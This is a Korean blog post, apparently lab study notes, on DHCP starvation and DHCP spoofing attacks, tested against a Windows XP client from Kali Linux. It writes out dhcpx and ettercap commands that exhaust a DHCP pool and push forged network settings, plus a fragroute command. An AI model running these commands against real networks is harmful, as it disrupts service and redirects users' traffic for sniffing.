---
title:  "DHCP Attack" 

categories:
  - spoofing
tags:
  - [DHCP]

toc: true

date: 2022-10-04
last_modified_at: 2022-10-04
---

## DHCP Attack

- DHCP Attack
  - 공격자가 DHCP 클라이언트 또는 서버로 위장하여 변조된 DHCP 메시지를 이용하여 수행하는 공격
  - 정상 DHCP서버를 마비(Dos) 시키거나 클라이언트에게 변조된 네트워크 정보를 전달하여 데이터의 전달 흐름을 공격자로 유도(Sniffing) 함

- DHCP 취약점
  - UDP를 이용 함 → 비 신뢰성, 비 연결성 - DHCP 자체의 인증 메커니즘이 없음  누구나 원할 때 클라이언트, 서버 역할을 할 수 있음 → 진위성을 확인할 수 없음  Client → 요청으로 전달한 XID, port의 일치 여부만 확인  Server → MAC주소로 Client 구분만 함

- DHCP Attack 분류
  - DHCP Starvation → DHCP Server의 Pool을 모두 소모시키는 공격 → Dos Attack
  기존의 DHCP 서버의 기능을 사용하지 못하게 하는것 : 가용성 공격
  - DHCP Spoofing → DHCP Client에게 조작된 네트워크 정보를 전달하는 공격 DHCP 서버를 사칭 : 무결성 공격

- 환경 구성

  - DHCP 서버 구성![화면 캡처 2022-10-04 180253](../../assets/img/화면 캡처 2022-10-04 180253.png)

    ![화면 캡처 2022-10-04 180406](../../assets/img/화면 캡처 2022-10-04 180406.png)

    ![화면 캡처 2022-10-04 180428](../../assets/img/화면 캡처 2022-10-04 180428.png)

    ![화면 캡처 2022-10-04 180506](../../assets/img/화면 캡처 2022-10-04 180506.png)

    ![화면 캡처 2022-10-04 180541](../../assets/img/화면 캡처 2022-10-04 180541.png)

    ![화면 캡처 2022-10-04 180952](../../assets/img/화면 캡처 2022-10-04 180952.png)

  - DHCP 클라이언트  테스트

    ```
    C:\Documents and Settings\ktest>ipconfig /all
    ```

    ![화면 캡처 2022-10-04 181054](../../assets/img/화면 캡처 2022-10-04 181054.png)

    > 주소 임대 해제

    ```
    C:\Documents and Settings\ktest>ipconfig /release
    ```

    ![화면 캡처 2022-10-04 181125](../../assets/img/화면 캡처 2022-10-04 181125.png)

    > 주소 재 임대

    ```
    C:\Documents and Settings\ktest>ipconfig /renew
    ```

    ![화면 캡처 2022-10-04 181148](../../assets/img/화면 캡처 2022-10-04 181148.png)

## DHCP startvation

- 구성도

![Untitled (1)](../../assets/img/Untitled (1)-1664881561157-16.png)

- 설정

  - kali

    ```
    ┌──(root㉿kali)-[~]
    └─# dhcpx 
    ```

    ![화면 캡처 2022-10-04 181352](../../assets/img/화면 캡처 2022-10-04 181352.png)

    ![화면 캡처 2022-10-04 181552](../../assets/img/화면 캡처 2022-10-04 181552.png)

    ```
    kali 2016] 
    └─# dhcpx -i eth0 -D 172.16.0.105
    ```

    ![화면 캡처 2022-10-04 190653](../../assets/img/화면 캡처 2022-10-04 190653.png)

  - xp

    > 주소 임대 실패

    ```
    C:\Documents and Settings\ktest>ipconfig /renew
    ```

    ![화면 캡처 2022-10-04 192654](../../assets/img/화면 캡처 2022-10-04 192654.png)

    ![화면 캡처 2022-10-04 193044](../../assets/img/화면 캡처 2022-10-04 193044.png)

    ![화면 캡처 2022-10-04 190707](../../assets/img/화면 캡처 2022-10-04 190707.png)

- DHCP Spoofing

  - ettercap 을 이용한 dhcp spoofing

    ```
    kali 2016] 
    └─# ettercap -i eth0 -T -M dhcp:172.16.0.80-90/255.255.255.0/203.248.252.2   -> 80~90번대로 받도록 한다
    ```

    ![Untitled](../../assets/img/Untitled-1664882805513-25.png)

    ```
    xp]
    C:\Documents and Settings\ktest>release
    C:\Documents and Settings\ktest>renew
    ```

    ![화면 캡처 2022-10-04 193746](../../assets/img/화면 캡처 2022-10-04 193746-1664883063272-32.png)

    ```
    C:\Documents and Settings\ktest>ipconfig /all
    ```

    ![화면 캡처 2022-10-04 193839](../../assets/img/화면 캡처 2022-10-04 193839.png)

    ```
    kali 2016]
    # fragroute -B1
    ```

    ![Untitled](../../assets/img/Untitled-1664883930848-36.png)

    ```
    xp]
    ping 8.8.8.8
    ```

    ![화면 캡처 2022-10-04 200044](../../assets/img/화면 캡처 2022-10-04 200044.png)



<br>

[맨 위로 이동하기](#){: .btn .btn--primary }{: .align-right}